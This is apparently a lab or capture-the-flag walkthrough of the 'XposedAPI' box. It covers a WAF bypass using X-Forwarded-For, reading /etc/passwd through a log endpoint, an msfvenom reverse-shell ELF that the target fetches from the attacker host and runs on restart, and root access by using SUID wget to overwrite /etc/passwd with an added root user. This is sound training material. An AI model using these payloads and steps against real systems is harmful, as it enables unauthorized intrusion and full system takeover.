##### Tags: `wget`  `web enum`  `API`  `SUID`  `add new user`  `elf`

# 🐧XposedAPI🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.195.134

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
13337/tcp open  http    Gunicorn 20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 13337 is running Remote Software Management API
```console

/update
Methods: POST
Updates the app using a linux executable. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}

/logs
Methods: GET
Read log files.

/restart
Methods: GET
To request the restart of the app.
```
/logs is blocked by WAF
```console
http://192.168.195.134:13337/logs

WAF: Access Denied for this Host.
```
but we can use xforwarded to bypass it  
use burp suite add X-Forwarded-For: localhost to bypass restriction
```console
GET /logs?file=/etc/passwd HTTP/1.1
Host: 192.168.195.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.195.134:13337/restart
Connection: keep-alive
X-Forwarded-For: 127.0.0.1
```
found the user clumsyadmin
```console
root:x:0:0:root:/root:/bin/bash
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
```
since we have username  
the plan is create a elf revershell for the api to download and restart to execute it  
elf reverse shell
```console
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=22 -f elf -o reverse.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: reverse.elf
```
downlaod from our machine
```console
POST /update HTTP/1.1
Host: 192.168.195.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json 
Content-Length: 70

{"user":"clumsyadmin", "url":"http://192.168.45.217/reverse.elf"} 
```
Response
```console
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Mon, 23 Mar 2026 13:35:09 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 81

Update requested by clumsyadmin. Restart the software for changes to take effect.
```
restart the server
```console
GET /restart HTTP/1.1

                   x.open("POST", document.URL.toString());
                    x.send('{"confirm":"true"}');
```
we need to include the confirmation is ture
```console
GET /restart HTTP/1.1
Host: 192.168.195.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 18

{"confirm":"true"}
```
get the shell
```console
$ penelope -p 22
[+] Listening for reverse shells on 0.0.0.0:22 →  127.0.0.1 • 10.0.2.15 • 192.168.45.217
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from xposedapi 192.168.195.134 Linux-x86_64 👤 clumsyadmin(1000) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/xposedapi~192.168.195.134-Linux-x86_64/2026_03_24-00_36_38-282.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ id
uid=1000(clumsyadmin) gid=1000(clumsyadmin) groups=1000(clumsyadmin)
```
## Privilege Escalation
we have SUID in wget command
```console
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/wget
```
https://gtfobins.org/gtfobins/wget/#shell  
we can just add a new root user and write into the /etc/passwd file  
password 123
```console
openssl passwd 123 
$1$Ch6Abf9q$ct70p83XmXeNks5HbUFYL1
```
add the new root user1 with the passwd hash
```console
root:x:0:0:root:/root:/bin/bash
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
user1:$1$Ch6Abf9q$ct70p83XmXeNks5HbUFYL1:0:0:root:/root:/bin/bash
```
transfer and replace the old file
```console
clumsyadmin@xposedapi:/tmp$ wget http://192.168.45.217/passwd -O /etc/passwd
--2026-03-23 09:07:16--  http://192.168.45.217/passwd
Connecting to 192.168.45.217:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1463 (1.4K) [application/octet-stream]
Saving to: ‘/etc/passwd’

/etc/passwd                  100%[============================================>]   1.43K  --.-KB/s    in 0s
```
su to the root user1
```console
clumsyadmin@xposedapi:/tmp$ su user1
Password:123
root@xposedapi:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
